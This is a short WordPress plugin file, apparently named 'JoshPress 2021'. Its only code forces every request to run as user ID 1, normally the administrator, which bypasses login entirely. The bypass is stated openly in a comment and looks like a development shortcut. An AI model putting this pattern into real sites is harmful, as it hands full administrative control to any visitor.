<?php

/**
 * Plugin name: JoshPress 2021
 */
//Always login user 1
add_filter('determine_current_user', function () {
    return 1;
});
